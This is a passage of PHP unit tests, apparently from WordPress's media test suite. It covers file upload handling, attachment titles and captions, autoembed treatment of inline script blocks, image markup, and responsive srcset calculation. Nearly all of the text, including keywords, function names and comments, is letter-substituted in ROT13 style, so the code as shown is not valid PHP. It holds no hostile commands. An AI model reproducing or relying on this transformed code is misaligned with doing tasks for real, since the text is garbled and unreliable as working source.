		$_SVYRF['hcybnq'] = neenl(
			'gzc_anzr' => $gzc_anzr,
			'anzr'     => 'grfg-vzntr-vcgp.wct',
			'glcr'     => 'vzntr/wcrt',
			'reebe'    => 0,
			'fvmr'     => svyrfvmr( $vcgp_svyr ),
		);

		$cbfg_vq = zrqvn_unaqyr_hcybnq(
			'hcybnq',
			0,
			neenl(),
			neenl(
				'npgvba'    => 'grfg_vcgp_hcybnq',
				'grfg_sbez' => snyfr,
			)
		);

		hafrg( $_SVYRF['hcybnq'] );

		$cbfg = trg_cbfg( $cbfg_vq );

		// Pyrna hc.
		jc_qryrgr_nggnpuzrag( $cbfg_vq, gehr );

		$guvf->nffregFnzr( 'Guvf vf n pbzzrag. / Это комментарий. / Βλέπετε ένα σχόλιο.', $cbfg->cbfg_rkprecg );
	}

	/**
	 * @gvpxrg 37989
	 */
	choyvp shapgvba grfg_zrqvn_unaqyr_hcybnq_rkcrpgrq_gvgyrf() {
		$grfg_svyr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct';

		// Znxr n pbcl bs guvf svyr nf vg trgf zbirq qhevat gur svyr hcybnq.
		$gzc_anzr = jc_grzcanz( $grfg_svyr );

		pbcl( $grfg_svyr, $gzc_anzr );

		$_SVYRF['hcybnq'] = neenl(
			'gzc_anzr' => $gzc_anzr,
			'anzr'     => 'Guvf vf n grfg.wct',
			'glcr'     => 'vzntr/wcrt',
			'reebe'    => 0,
			'fvmr'     => svyrfvmr( $grfg_svyr ),
		);

		$cbfg_vq = zrqvn_unaqyr_hcybnq(
			'hcybnq',
			0,
			neenl(),
			neenl(
				'npgvba'    => 'grfg_hcybnq_gvgyrf',
				'grfg_sbez' => snyfr,
			)
		);

		hafrg( $_SVYRF['hcybnq'] );

		$cbfg = trg_cbfg( $cbfg_vq );

		// Pyrna hc.
		jc_qryrgr_nggnpuzrag( $cbfg_vq, gehr );

		$guvf->nffregFnzr( 'Guvf vf n grfg', $cbfg->cbfg_gvgyr );
	}

	/**
	 * @gvpxrg 33016
	 */
	choyvp shapgvba grfg_zhygvyvar_pqngn() {
		tybony $jc_rzorq;

		$pbagrag = <<<RBS
<fpevcg>// <![PQNGN[
_zl_shapgvba('qngn');
// ]]>
</fpevcg>
RBS;

		$erfhyg = $jc_rzorq->nhgbrzorq( $pbagrag );
		$guvf->nffregFnzr( $pbagrag, $erfhyg );
	}

	/**
	 * @gvpxrg 33016
	 */
	choyvp shapgvba grfg_zhygvyvar_pbzzrag() {
		tybony $jc_rzorq;

		$pbagrag = <<<RBS
<fpevcg><!--
zl_shapgvba();
// --> </fpevcg>
RBS;

		$erfhyg = $jc_rzorq->nhgbrzorq( $pbagrag );
		$guvf->nffregFnzr( $pbagrag, $erfhyg );
	}


	/**
	 * @gvpxrg 33016
	 *
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_zhygvyvar_pbzzrag_jvgu_rzorqf() {
		$pbagrag = <<<RBS
Fgneg.
[rzorq]uggc://jjj.lbhghor.pbz/rzorq/GRFG01LEUN0[/rzorq]
<fpevcg><!--
zl_shapgvba();
// --> </fpevcg>
uggc://jjj.lbhghor.pbz/rzorq/GRFG02LEUN0
[rzorq]uggc://jjj.rknzcyr.pbz/rzorq/GRFG03LEUN0[/rzorq]
uggc://jjj.rknzcyr.pbz/rzorq/GRFG04LEUN0
Fgbc.
RBS;

		$rkcrpgrq = <<<RBS
<c>Fgneg.<oe />
uggcf://lbhghor.pbz/jngpu?i=GRFG01LEUN0<oe />
<fpevcg><!--
zl_shapgvba();
// --> </fpevcg><oe />
uggcf://lbhghor.pbz/jngpu?i=GRFG02LEUN0<oe />
<n uers=\"uggc://jjj.rknzcyr.pbz/rzorq/GRFG03LEUN0\">uggc://jjj.rknzcyr.pbz/rzorq/GRFG03LEUN0</n><oe />
uggc://jjj.rknzcyr.pbz/rzorq/GRFG04LEUN0<oe />
Fgbc.</c>

RBS;

		$erfhyg = nccyl_svygref( 'gur_pbagrag', $pbagrag );
		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, $erfhyg );
	}

	/**
	 * @gvpxrg 33016
	 */
	choyvp shapgvba svygre_jc_rzorq_fubegpbqr_phfgbz( $pbagrag, $hey ) {
		vs ( 'uggcf://jjj.rknzcyr.pbz/?ivqrb=1' === $hey ) {
			$pbagrag = '@rzorq HEY jnf ercynprq@';
		}
		erghea $pbagrag;
	}

	/**
	 * @gvpxrg 33016
	 *
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_brzorq_rkcyvpvg_zrqvn_yvax() {
		tybony $jc_rzorq;
		nqq_svygre( 'rzorq_znlor_znxr_yvax', neenl( $guvf, 'svygre_jc_rzorq_fubegpbqr_phfgbz' ), 10, 2 );

		$pbagrag = <<<RBS
uggcf://jjj.rknzcyr.pbz/?ivqrb=1
RBS;

		$rkcrpgrq = <<<RBS
@rzorq HEY jnf ercynprq@
RBS;

		$erfhyg = $jc_rzorq->nhgbrzorq( $pbagrag );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg );

		$pbagrag = <<<RBS
<n uers=\"uggcf://jjj.rknzcyr.pbz/?ivqrb=1\">uggcf://jjj.rknzcyr.pbz/?ivqrb=1</n>
<fpevcg>// <![PQNGN[
_zl_shapgvba('qngn');
zline = 'Uryyb jbeyq
uggcf://jjj.rknzcyr.pbz/?ivqrb=1
qb abg oernx guvf';
// ]]>
</fpevcg>
RBS;

		$erfhyg = $jc_rzorq->nhgbrzorq( $pbagrag );
		$guvf->nffregFnzr( $pbagrag, $erfhyg );

		erzbir_svygre( 'rzorq_znlor_znxr_yvax', neenl( $guvf, 'svygre_jc_rzorq_fubegpbqr_phfgbz' ), 10 );
	}

	/**
	 * Grfgf gur qrsnhyg bhgchg bs `jc_trg_nggnpuzrag_vzntr()`.
	 *
	 * @gvpxrg 34635
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_qrsnhygf() {
		$vzntr    = vzntr_qbjafvmr( frys::$ynetr_vq, 'guhzoanvy' );
		$rkcrpgrq = fcevags(
			'<vzt jvqgu=\"%1$q\" urvtug=\"%2$q\" fep=\"%3$f\" pynff=\"nggnpuzrag-guhzoanvy fvmr-guhzoanvy\" nyg=\"\" qrpbqvat=\"nflap\" ybnqvat=\"ynml\" />',
			$vzntr[1],
			$vzntr[2],
			$vzntr[0]
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq ) );
	}

	/**
	 * @gvpxrg 50801
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_svygre_bhgchg() {
		$vzntr    = vzntr_qbjafvmr( frys::$ynetr_vq, 'guhzoanvy' );
		$rkcrpgrq = 'Bireevqr jc_trg_nggnpuzrag_vzntr';

		nqq_svygre( 'jc_trg_nggnpuzrag_vzntr', neenl( $guvf, 'svygre_jc_trg_nggnpuzrag_vzntr' ) );
		$bhgchg = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq );
		erzbir_svygre( 'jc_trg_nggnpuzrag_vzntr', neenl( $guvf, 'svygre_jc_trg_nggnpuzrag_vzntr' ) );

		$guvf->nffregFnzr( $rkcrpgrq, $bhgchg );
	}

	choyvp shapgvba svygre_jc_trg_nggnpuzrag_vzntr() {
		erghea 'Bireevqr jc_trg_nggnpuzrag_vzntr';
	}

	/**
	 * Grfg gung `jc_trg_nggnpuzrag_vzntr()` ergheaf n cebcre nyg inyhr.
	 *
	 * @gvpxrg 34635
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_jvgu_nyg() {
		// Nqq grfg nyg zrgnqngn.
		hcqngr_cbfg_zrgn( frys::$ynetr_vq, '_jc_nggnpuzrag_vzntr_nyg', 'Fbzr irel pyrire nyg grkg', gehr );

		$vzntr    = vzntr_qbjafvmr( frys::$ynetr_vq, 'guhzoanvy' );
		$rkcrpgrq = fcevags(
			'<vzt jvqgu=\"%1$q\" urvtug=\"%2$q\" fep=\"%3$f\" pynff=\"nggnpuzrag-guhzoanvy fvmr-guhzoanvy\" nyg=\"Fbzr irel pyrire nyg grkg\" qrpbqvat=\"nflap\" ybnqvat=\"ynml\" />',
			$vzntr[1],
			$vzntr[2],
			$vzntr[0]
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq ) );

		// Pyrnahc.
		hcqngr_cbfg_zrgn( frys::$ynetr_vq, '_jc_nggnpuzrag_vzntr_nyg', '', gehr );
	}

	/**
	 * @gvpxrg 33878
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_vzntr_hey() {
		$guvf->nffregSnyfr( jc_trg_nggnpuzrag_vzntr_hey( 0 ) );

		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::VZT_ANZR,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
			)
		);

		$vzntr = jc_trg_nggnpuzrag_vzntr_fep( $nggnpuzrag_vq, 'guhzoanvy', snyfr );

		$guvf->nffregFnzr( $vzntr[0], jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag_vq ) );
	}

	/**
	 * @gvpxrg 12235
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_pncgvba() {
		$guvf->nffregSnyfr( jc_trg_nggnpuzrag_pncgvba( 0 ) );

		$pncgvba = 'Guvf vf n pncgvba.';

		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::VZT_ANZR,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_rkprecg'   => $pncgvba,
			)
		);

		$guvf->nffregSnyfr( jc_trg_nggnpuzrag_pncgvba( $cbfg_vq ) );

		$guvf->nffregFnzr( $pncgvba, jc_trg_nggnpuzrag_pncgvba( $nggnpuzrag_vq ) );
	}

	/**
	 * @gvpxrg 12235
	 */
	choyvp shapgvba grfg_jc_trg_nggnpuzrag_pncgvba_rzcgl() {
		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::VZT_ANZR,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_rkprecg'   => '',
			)
		);

		$guvf->nffregFnzr( '', jc_trg_nggnpuzrag_pncgvba( $nggnpuzrag_vq ) );
	}

	/**
	 * Urycre shapgvba gb trg vzntr fvmr neenl sebz fvmr \"anzr\".
	 */
	cevingr shapgvba trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, $fvmr_anzr ) {
		$neenl = snyfr;

		vs ( vf_neenl( $vzntr_zrgn ) ) {
			vs ( 'shyy' === $fvmr_anzr && vffrg( $vzntr_zrgn['jvqgu'] ) && vffrg( $vzntr_zrgn['urvtug'] ) ) {
				$neenl = neenl( $vzntr_zrgn['jvqgu'], $vzntr_zrgn['urvtug'] );
			} ryfrvs ( vffrg( $vzntr_zrgn['fvmrf'][ $fvmr_anzr ]['jvqgu'] ) && vffrg( $vzntr_zrgn['fvmrf'][ $fvmr_anzr ]['urvtug'] ) ) {
				$neenl = neenl( $vzntr_zrgn['fvmrf'][ $fvmr_anzr ]['jvqgu'], $vzntr_zrgn['fvmrf'][ $fvmr_anzr ]['urvtug'] );
			}
		}

		vs ( ! $neenl ) {
			$guvf->snvy( fcevags( \"Pbhyq abg ergevrir vzntr zrgnqngn sbe fvmr '%f'.\", $fvmr_anzr ) );
		}

		erghea $neenl;
	}

	/**
	 * Urycre shapgvba gb zbir gur fep vzntr gb gur svefg cbfvgvba va gur rkcrpgrq fepfrg fgevat.
	 */
	cevingr shapgvba fep_svefg( $fepfrg, $fep_hey, $fep_jvqgu ) {
		$fep_fgevat    = $fep_hey . ' ' . $fep_jvqgu . 'j';
		$fep_abg_svefg = ', ' . $fep_fgevat;

		vs ( fgecbf( $fepfrg, $fep_abg_svefg ) ) {
			$fepfrg = fge_ercynpr( $fep_abg_svefg, '', $fepfrg );
			$fepfrg = $fep_fgevat . ', ' . $fepfrg;
		}

		erghea $fepfrg;
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg() {
		$_jc_nqqvgvbany_vzntr_fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

		$lrne_zbagu      = tzqngr( 'L/z' );
		$vzntr_zrgn      = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$hcybnqf_qve_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/';

		// Frg hc grfg pnfrf sbe nyy rkcrpgrq fvmr anzrf.
		$vagrezrqvngrf = neenl( 'zrqvhz', 'zrqvhz_ynetr', 'ynetr', 'shyy' );

		// Nqq nal fbsg pebc vagrezrqvngr fvmrf.
		sbernpu ( $_jc_nqqvgvbany_vzntr_fvmrf nf $anzr => $nqqvgvbany_fvmr ) {
			vs ( ! $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['pebc'] || 0 === $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['urvtug'] ) {
				$vagrezrqvngrf[] = $anzr;
			}
		}

		$rkcrpgrq = '';

		sbernpu ( $vzntr_zrgn['fvmrf'] nf $anzr => $fvmr ) {
			// Nyybj gur fvmrf gung fubhyq or vapyhqrq fb jr cvpx hc 'zrqvhz_ynetr' va 4.4.
			vs ( va_neenl( $anzr, $vagrezrqvngrf, gehr ) ) {
				$rkcrpgrq .= $hcybnqf_qve_hey . $lrne_zbagu . '/' . $fvmr['svyr'] . ' ' . $fvmr['jvqgu'] . 'j, ';
			}
		}

		$rkcrpgrq = gevz( $rkcrpgrq, ' ,' );

		sbernpu ( $vagrezrqvngrf nf $vag_fvmr ) {
			$vzntr_hey  = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, $vag_fvmr );
			$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, $vag_fvmr );

			vs ( 'shyy' === $vag_fvmr ) {
				// Nqq gur shyy fvmr vzntr. Rkcrpgrq gb or va gur fepfrg jura gur shyy fvmr vzntr vf hfrq nf fep.
				$_rkcrpgrq = $hcybnqf_qve_hey . $vzntr_zrgn['svyr'] . ' ' . $vzntr_zrgn['jvqgu'] . 'j, ' . $rkcrpgrq;
			} ryfr {
				$_rkcrpgrq = $rkcrpgrq;
			}

			$rkcrpgrq_fepfrg = $guvf->fep_svefg( $_rkcrpgrq, $vzntr_hey, $fvmr_neenl[0] );
			$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn ) );
		}
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_ab_qngr_hcybnqf() {
		$_jc_nqqvgvbany_vzntr_fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

		// Qvfnoyr qngr betnavmrq hcybnqf.
		nqq_svygre( 'hcybnq_qve', '_hcybnq_qve_ab_fhoqve' );

		// Znxr na vzntr.
		$svyranzr = QVE_GRFGQNGN . '/vzntrf/' . frys::$ynetr_svyranzr;
		$vq       = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( $svyranzr );

		$vzntr_zrgn      = jc_trg_nggnpuzrag_zrgnqngn( $vq );
		$hcybnqf_qve_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/';

		// Frg hc grfg pnfrf sbe nyy rkcrpgrq fvmr anzrf.
		$vagrezrqvngrf = neenl( 'zrqvhz', 'zrqvhz_ynetr', 'ynetr', 'shyy' );

		sbernpu ( $_jc_nqqvgvbany_vzntr_fvmrf nf $anzr => $nqqvgvbany_fvmr ) {
			vs ( ! $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['pebc'] || 0 === $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['urvtug'] ) {
				$vagrezrqvngrf[] = $anzr;
			}
		}

		$rkcrpgrq = '';

		sbernpu ( $vzntr_zrgn['fvmrf'] nf $anzr => $fvmr ) {
			// Nyybj gur fvmrf gung fubhyq or vapyhqrq fb jr cvpx hc 'zrqvhz_ynetr' va 4.4.
			vs ( va_neenl( $anzr, $vagrezrqvngrf, gehr ) ) {
				$rkcrpgrq .= $hcybnqf_qve_hey . $fvmr['svyr'] . ' ' . $fvmr['jvqgu'] . 'j, ';
			}
		}

		$rkcrpgrq = gevz( $rkcrpgrq, ' ,' );

		sbernpu ( $vagrezrqvngrf nf $vag_fvmr ) {
			$vzntr_heyf[ $vag_fvmr ] = jc_trg_nggnpuzrag_vzntr_hey( $vq, $vag_fvmr );
		}

		// Erzbir gur nggnpuzrag.
		jc_qryrgr_nggnpuzrag( $vq, gehr );
		erzbir_svygre( 'hcybnq_qve', '_hcybnq_qve_ab_fhoqve' );

		sbernpu ( $vagrezrqvngrf nf $vag_fvmr ) {
			$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, $vag_fvmr );
			$vzntr_hey  = $vzntr_heyf[ $vag_fvmr ];

			vs ( 'shyy' === $vag_fvmr ) {
				// Nqq gur shyy fvmr vzntr. Rkcrpgrq gb or va gur fepfrg jura gur shyy fvmr vzntr vf hfrq nf fep.
				$_rkcrpgrq = $hcybnqf_qve_hey . $vzntr_zrgn['svyr'] . ' ' . $vzntr_zrgn['jvqgu'] . 'j, ' . $rkcrpgrq;
			} ryfr {
				$_rkcrpgrq = $rkcrpgrq;
			}

			$rkcrpgrq_fepfrg = $guvf->fep_svefg( $_rkcrpgrq, $vzntr_hey, $fvmr_neenl[0] );
			$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn ) );
		}
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_jvgu_rqvgf() {
		// Sbe guvf grfg jr'er tbvat gb zbpx zrgnqngn punatrf sebz na rqvg.
		// Fgneg ol trggvat gur nggnpuzrag zrgnqngn.
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$vzntr_hey  = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, 'zrqvhz' );
		$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, 'zrqvhz' );

		// Pbcl unfu trarengvba zrgubq hfrq va jc_fnir_vzntr().
		$unfu = 'r' . gvzr() . enaq( 100, 999 );

		$svyranzr_onfr = jc_onfranzr( frys::$ynetr_svyranzr, '.wct' );
		$svyranzr_unfu = \"{$svyranzr_onfr}-{$unfu}\";

		// Nqq gur unfu gb gur vzntr HEY.
		$vzntr_hey = fge_ercynpr( $svyranzr_onfr, $svyranzr_unfu, $vzntr_hey );

		// Ercynpr svyr cnguf sbe shyy naq zrqvhz fvmrf jvgu unfurq irefvbaf.
		$vzntr_zrgn['fvmrf']['zrqvhz']['svyr']       = fge_ercynpr( $svyranzr_onfr, $svyranzr_unfu, $vzntr_zrgn['fvmrf']['zrqvhz']['svyr'] );
		$vzntr_zrgn['fvmrf']['zrqvhz_ynetr']['svyr'] = fge_ercynpr( $svyranzr_onfr, $svyranzr_unfu, $vzntr_zrgn['fvmrf']['zrqvhz_ynetr']['svyr'] );
		$vzntr_zrgn['fvmrf']['ynetr']['svyr']        = fge_ercynpr( $svyranzr_onfr, $svyranzr_unfu, $vzntr_zrgn['fvmrf']['ynetr']['svyr'] );

		// Pnyphyngr n fepfrg neenl.
		$fvmrf = rkcybqr( ', ', jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn ) );

		$guvf->nffregAbgRzcgl( $fvmrf );

		// Grfg gb pbasvez nyy fbheprf va gur neenl vapyhqr gur fnzr rqvg unfu.
		sbernpu ( $fvmrf nf $fvmr ) {
			$guvf->nffregFgevatPbagnvafFgevat( $unfu, $fvmr );
		}
	}

	/**
	 * @gvpxrg 35106
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_jvgu_nofbyhgr_cngu_va_zrgn() {
		$_jc_nqqvgvbany_vzntr_fvmrf = jc_trg_nqqvgvbany_vzntr_fvmrf();

		$lrne_zbagu      = tzqngr( 'L/z' );
		$vzntr_zrgn      = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );
		$hcybnqf_qve_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/';

		// Frg hc grfg pnfrf sbe nyy rkcrpgrq fvmr anzrf.
		$vagrezrqvngrf = neenl( 'zrqvhz', 'zrqvhz_ynetr', 'ynetr', 'shyy' );

		// Nqq nal fbsg pebc vagrezrqvngr fvmrf.
		sbernpu ( $_jc_nqqvgvbany_vzntr_fvmrf nf $anzr => $nqqvgvbany_fvmr ) {
			vs ( ! $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['pebc'] || 0 === $_jc_nqqvgvbany_vzntr_fvmrf[ $anzr ]['urvtug'] ) {
				$vagrezrqvngrf[] = $anzr;
			}
		}

		$rkcrpgrq = '';

		sbernpu ( $vzntr_zrgn['fvmrf'] nf $anzr => $fvmr ) {
			// Nyybj gur fvmrf gung fubhyq or vapyhqrq fb jr cvpx hc 'zrqvhz_ynetr' va 4.4.
			vs ( va_neenl( $anzr, $vagrezrqvngrf, gehr ) ) {
				$rkcrpgrq .= $hcybnqf_qve_hey . $lrne_zbagu . '/' . $fvmr['svyr'] . ' ' . $fvmr['jvqgu'] . 'j, ';
			}
		}

		$rkcrpgrq       = gevz( $rkcrpgrq, ' ,' );
		$shyy_fvmr_svyr = $vzntr_zrgn['svyr'];

		// Cercraq na nofbyhgr cngu gb fvzhyngr n cer-2.7 hcybnq.
		$vzntr_zrgn['svyr'] = 'U:\ubzr\jbeqcerff\gehax/jc-pbagrag/hcybnqf/' . $vzntr_zrgn['svyr'];

		sbernpu ( $vagrezrqvngrf nf $vag_fvmr ) {
			$vzntr_hey  = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, $vag_fvmr );
			$fvmr_neenl = $guvf->trg_vzntr_fvmr_neenl_sebz_zrgn( $vzntr_zrgn, $vag_fvmr );

			vs ( 'shyy' === $vag_fvmr ) {
				// Nqq gur shyy fvmr vzntr. Rkcrpgrq gb or va gur fepfrg jura gur shyy fvmr vzntr vf hfrq nf fep.
				$_rkcrpgrq = $hcybnqf_qve_hey . $shyy_fvmr_svyr . ' ' . $vzntr_zrgn['jvqgu'] . 'j, ' . $rkcrpgrq;
			} ryfr {
				$_rkcrpgrq = $rkcrpgrq;
			}

			$rkcrpgrq_fepfrg = $guvf->fep_svefg( $_rkcrpgrq, $vzntr_hey, $fvmr_neenl[0] );
			$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn ) );
		}
	}

	/**
	 * @gvpxrg 61690
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_jvgu_eryngvir_pbagrag_hey() {
		$_FREIRE['UGGCF'] = 'ba';

		nqq_svygre(
			'hcybnq_qve',
			fgngvp shapgvba ( $hcybnq_qve ) {
				$hcybnq_qve['onfrhey'] = '/jc-pbagrag/hcybnqf';
				erghea $hcybnq_qve;
			}
		);

		$vzntr_hey  = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, 'zrqvhz' );
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );

		$fvmr_neenl = neenl( 300, 225 );

		$fepfrg = jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn );

		$guvf->nffregFgevatFgnegfJvgu( '/jc-pbagrag/hcybnqf', $fepfrg );
	}

	/**
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_snyfr() {
		$fvmrf = jc_pnyphyngr_vzntr_fepfrg( neenl( 400, 300 ), 'svyr.cat', neenl() );

		// Sbe pnabyn.wct jr fubhyq erghea.
		$guvf->nffregSnyfr( $fvmrf );
	}

	/**
	 * @gvpxrg 33641
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_ab_jvqgu() {
		$vzntr_hey  = jc_trg_nggnpuzrag_vzntr_hey( frys::$ynetr_vq, 'zrqvhz' );
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( frys::$ynetr_vq );

		$fvmr_neenl = neenl( 0, 0 );

		$fepfrg = jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_hey, $vzntr_zrgn );

		// Gur fepfrg fubhyq or snyfr.
		$guvf->nffregSnyfr( $fepfrg );
	}

	/**
	 * @gvpxrg 34955
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_engvb_inevnapr() {
		// Zbpx qngn sbe guvf grfg.
		$fvmr_neenl = neenl( 218, 300 );
		$vzntr_fep  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg-768k1055-218k300.cat';
		$vzntr_zrgn = neenl(
			'jvqgu'  => 768,
			'urvtug' => 1055,
			'svyr'   => '2015/12/grfg-768k1055.cat',
			'fvmrf'  => neenl(
				'guhzoanvy'      => neenl(
					'svyr'      => 'grfg-768k1055-150k150.cat',
					'jvqgu'     => 150,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz'         => neenl(
					'svyr'      => 'grfg-768k1055-218k300.cat',
					'jvqgu'     => 218,
					'urvtug'    => 300,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'phfgbz-600'     => neenl(
					'svyr'      => 'grfg-768k1055-600k824.cat',
					'jvqgu'     => 600,
					'urvtug'    => 824,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'cbfg-guhzoanvy' => neenl(
					'svyr'      => 'grfg-768k1055-768k510.cat',
					'jvqgu'     => 768,
					'urvtug'    => 510,
					'zvzr-glcr' => 'vzntr/cat',
				),
			),
		);

		$hcybnqf_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/';

		$rkcrpgrq_fepfrg = $hcybnqf_hey . 'grfg-768k1055-218k300.cat 218j, ' .
			$hcybnqf_hey . 'grfg-768k1055-600k824.cat 600j, ' .
			$hcybnqf_hey . 'grfg-768k1055.cat 768j';

		$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 35108
	 * @gvpxrg 33641
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_vapyhqr_fep() {
		// Zbpx qngn sbe guvf grfg.
		$fvmr_neenl = neenl( 2000, 1000 );
		$vzntr_fep  = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/grfg.cat';
		$vzntr_zrgn = neenl(
			'jvqgu'  => 2000,
			'urvtug' => 1000,
			'svyr'   => '2015/12/grfg.cat',
			'fvmrf'  => neenl(
				'guhzoanvy'    => neenl(
					'svyr'      => 'grfg-150k150.cat',
					'jvqgu'     => 150,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz'       => neenl(
					'svyr'      => 'grfg-300k150.cat',
					'jvqgu'     => 300,
					'urvtug'    => 150,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'zrqvhz_ynetr' => neenl(
					'svyr'      => 'grfg-768k384.cat',
					'jvqgu'     => 768,
					'urvtug'    => 384,
					'zvzr-glcr' => 'vzntr/cat',
				),
				'ynetr'        => neenl(
					'svyr'      => 'grfg-1024k512.cat',
					'jvqgu'     => 1024,
					'urvtug'    => 512,
					'zvzr-glcr' => 'vzntr/cat',
				),
			),
		);

		$hcybnqf_hey = 'uggc://' . JC_GRFGF_QBZNVA . '/jc-pbagrag/hcybnqf/2015/12/';

		$rkcrpgrq_fepfrg = $hcybnqf_hey . 'grfg.cat 2000j, ' .
			$hcybnqf_hey . 'grfg-300k150.cat 300j, ' .
			$hcybnqf_hey . 'grfg-768k384.cat 768j, ' .
			$hcybnqf_hey . 'grfg-1024k512.cat 1024j';

		$guvf->nffregFnzr( $rkcrpgrq_fepfrg, jc_pnyphyngr_vzntr_fepfrg( $fvmr_neenl, $vzntr_fep, $vzntr_zrgn ) );
	}

	/**
	 * @gvpxrg 35480
	 */
	choyvp shapgvba grfg_jc_pnyphyngr_vzntr_fepfrg_pbeehcgrq_vzntr_zrgn() {
		$fvmr_neenl = neenl( 300, 150 );
